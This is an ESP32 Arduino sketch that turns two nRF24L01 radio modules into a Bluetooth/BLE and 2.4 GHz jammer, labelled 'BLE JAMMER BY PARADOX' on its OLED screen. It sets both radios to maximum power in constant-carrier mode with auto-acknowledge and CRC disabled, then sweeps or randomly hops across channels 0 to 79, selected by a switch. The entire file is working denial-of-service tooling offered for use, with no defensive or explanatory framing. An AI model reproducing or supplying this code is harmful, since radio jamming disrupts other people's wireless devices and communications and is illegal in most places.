#include "RF24.h" 
#include <SPI.h>
#include <ezButton.h>
#include "esp_bt.h"
#include "esp_wifi.h"

// Include Adafruit SSD1306 and GFX libraries
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// OLED display settings
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 32
#define OLED_RESET    -1 // No reset pin needed for I2C

// Initialize Adafruit SSD1306 display object
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

SPIClass *sp = nullptr;
SPIClass *hp = nullptr;

RF24 radio(26, 15, 16000000);   //NFR24-1 HSPI CAN SET SPI SPEED TO 16000000 BY DEFAULT ITS 10000000
RF24 radio1(4, 2, 16000000);  //NRF24-2 VSPI CAN SET SPI SPEED TO 16000000 BY DEFAULT ITS 10000000

unsigned int flag = 0;   //HSPI// Flag variable to keep track of direction
unsigned int flagv = 0;  //VSPI// Flag variable to keep track of direction

int ch = 45;    // Variable to store value of ch
int ch1 = 45;   // Variable to store value of ch

ezButton toggleSwitch(33);

void two() {
  if (flagv == 0) {  
    ch1 += 4;
  } else {  
    ch1 -= 4;
  }

  if (flag == 0) {  
    ch += 2;
  } else {  
    ch -= 2;
  }

  if ((ch1 > 79) && (flagv == 0)) {
    flagv = 1;                            
  } else if ((ch1 < 2) && (flagv == 1)) {
    flagv = 0;                            
  }

  if ((ch > 79) && (flag == 0)) {
    flag = 1;                            
  } else if ((ch < 2) && (flag == 1)) {
    flag = 0;                            
  }

  radio.setChannel(ch);
  radio1.setChannel(ch1);
}

void one() {
  radio1.setChannel(random(80));
  radio.setChannel(random(80));
  delayMicroseconds(random(60));
}

void setup() {
  Serial.begin(115200);

  // Initialize OLED
  if (!display.begin(SSD1306_I2C_ADDRESS, OLED_RESET)) {
    Serial.println(F("SSD1306 allocation failed"));
    for(;;);
  }
  display.clearDisplay();
  display.setTextSize(1);      
  display.setTextColor(SSD1306_WHITE);  
  display.setCursor(0,0);
  display.println(F("BLE JAMMER BY"));
  display.println(F("**********"));
  display.println(F("PARADOX :)"));
  display.display();   
  delay(5000);

  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_wifi_disconnect();

  toggleSwitch.setDebounceTime(50);

  initHP();
  initSP();
}

void initSP() {
  sp = new SPIClass(VSPI);
  sp->begin();

  if (radio1.begin(sp)) {
    Serial.println("VSPI Jammer Started !!!");
    display.clearDisplay();
    display.setCursor(0,0);
    display.println(F("VSPI Jammer ON!"));
    display.display();
    radio1.setAutoAck(false);
    radio1.stopListening();
    radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MAX, true);
    radio1.setDataRate(RF24_2MBPS);
    radio1.setCRCLength(RF24_CRC_DISABLED);
    radio1.printPrettyDetails();
    radio1.startConstCarrier(RF24_PA_MAX, ch1);
  } else {
    Serial.println("VSPI Jammer couldn't start !!!");
    display.clearDisplay();
    display.setCursor(0,0);
    display.println(F("VSPI Jammer fail"));
    display.display();
  }
}

void initHP() {
  hp = new SPIClass(HSPI);
  hp->begin();

  if (radio.begin(hp)) {
    Serial.println("HSPI Started !!!");
    display.clearDisplay();
    display.setCursor(0,1);
    display.println(F("HSPI Jammer ON!"));
    display.display();
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, ch);
  } else {
    Serial.println("HSPI couldn't start !!!");
    display.clearDisplay();
    display.setCursor(0,1);
    display.println(F("HSPI Jammer fail"));
    display.display();
  }
}

void loop() {
  toggleSwitch.loop();  

  int state = toggleSwitch.getState();

  if (state == HIGH)
    two();
  else {
    one();
  }
}
